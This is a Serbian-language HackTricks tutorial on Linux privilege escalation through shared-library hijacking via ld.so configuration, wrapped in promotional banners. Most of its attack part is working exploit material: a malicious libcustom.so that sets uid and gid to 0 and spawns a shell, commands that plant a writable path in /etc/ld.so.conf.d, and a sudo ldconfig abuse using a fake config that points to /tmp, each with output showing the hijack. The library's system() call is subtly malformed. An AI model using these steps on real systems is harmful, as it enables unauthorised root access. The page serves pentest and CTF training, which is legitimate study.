# ld.so privesc exploit example

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu u HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Priprema okruženja

U sledećem odeljku možete pronaći kod datoteka koje ćemo koristiti za pripremu okruženja

```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```

```c
#include <stdio.h>

void vuln_func();
```

```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```

{% tabs %}
{% tab title="Bash" %}
1. **Napravite** te datoteke na vašem računaru u istom folderu
2. **Kompajlirajte** biblioteku: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **Kopirajte** `libcustom.so` u `/usr/lib`: `sudo cp libcustom.so /usr/lib` (root privilegije)
4. **Kompajlirajte** izvršnu datoteku: `gcc sharedvuln.c -o sharedvuln -lcustom`

#### Proverite okruženje

Proverite da li se _libcustom.so_ **učitava** iz _/usr/lib_ i da li možete **izvršiti** binarnu datoteku.
{% endtab %}
{% endtabs %}

```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```

## Eksploatacija

U ovom scenariju pretpostavljamo da je **neko kreirao ranjiv unos** unutar datoteke u _/etc/ld.so.conf/_:

```bash
sudo echo "/home/ubuntu/lib" > /etc/ld.so.conf.d/privesc.conf
```

Ranjiva mapa je _/home/ubuntu/lib_ (gde imamo pristup za pisanje).\
**Preuzmite i kompajlirajte** sledeći kod unutar tog puta:

```c
//gcc -shared -o libcustom.so -fPIC libcustom.c

#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(){
setuid(0);
setgid(0);
printf("I'm the bad library\n");
system("/bin/sh",NULL,NULL);
}
```

Sada kada smo **kreirali zlonamernu libcustom biblioteku unutar pogrešno konfigurisane** putanje, moramo sačekati **ponovno pokretanje** ili da korisnik sa privilegijama root-a izvrši **`ldconfig`** (_u slučaju da možete izvršiti ovu binarnu datoteku kao **sudo** ili ima **suid bit**, moći ćete je izvršiti sami_).

Kada se to dogodi, **ponovo proverite** odakle se `sharevuln` izvršna datoteka učitava iz biblioteke `libcustom.so`:

```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```

Kao što možete videti, **učitava se iz `/home/ubuntu/lib`** i ako ga bilo koji korisnik izvrši, izvršiće se shell:

```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```

{% hint style="info" %}
Napomena da u ovom primeru nismo povećali privilegije, ali modifikovanjem izvršenih komandi i **čekanjem da korisnik sa privilegijama izvrši ranjivu binarnu datoteku** možemo povećati privilegije.
{% endhint %}

### Ostale loše konfiguracije - Ista ranjivost

U prethodnom primeru smo lažirali lošu konfiguraciju gde je administrator **postavio folder bez privilegija unutar konfiguracione datoteke unutar `/etc/ld.so.conf.d/`**.\
Ali postoje i druge loše konfiguracije koje mogu izazvati istu ranjivost, ako imate **dozvole za pisanje** u nekoj **konfiguracionoj datoteci** unutar `/etc/ld.so.conf.d`, u folderu `/etc/ld.so.conf.d` ili u datoteci `/etc/ld.so.conf`, možete konfigurisati istu ranjivost i iskoristiti je.

## Eksploatacija 2

**Pretpostavimo da imate sudo privilegije nad `ldconfig`**.\
Možete navesti `ldconfig` **odakle da učita konfiguracione datoteke**, tako da možemo iskoristiti to da `ldconfig` učita proizvoljne foldere.\
Dakle, kreirajmo potrebne datoteke i foldere da bismo učitali "/tmp":

```bash
cd /tmp
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```

Sada, kao što je naznačeno u **prethodnom eksploitu**, **kreirajte zlonamernu biblioteku unutar `/tmp`**.\
I na kraju, učitajte putanju i proverite odakle se binarna datoteka učitava biblioteka:

```bash
ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```

**Kao što možete videti, imajući sudo privilegije nad `ldconfig`-om, možete iskoristiti istu ranjivost.**

{% hint style="info" %}
**Nisam pronašao** pouzdan način za iskorišćavanje ove ranjivosti ako je `ldconfig` konfigurisan sa **suid bitom**. Pojavljuje se sledeća greška: `/sbin/ldconfig.real: Can't create temporary cache file /etc/ld.so.cache~: Permission denied`
{% endhint %}

## Reference

* [https://www.boiteaklou.fr/Abusing-Shared-Libraries.html](https://www.boiteaklou.fr/Abusing-Shared-Libraries.html)
* [https://blog.pentesteracademy.com/abusing-missing-library-for-privilege-escalation-3-minute-read-296dcf81bec2](https://blog.pentesteracademy.com/abusing-missing-library-for-privilege-escalation-3-minute-read-296dcf81bec2)
* Dab mašina na HTB-u

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini da podržite HackTricks:

* Ako želite da vidite **vašu kompaniju reklamiranu u HackTricks-u** ili **preuzmete HackTricks u PDF formatu**, proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
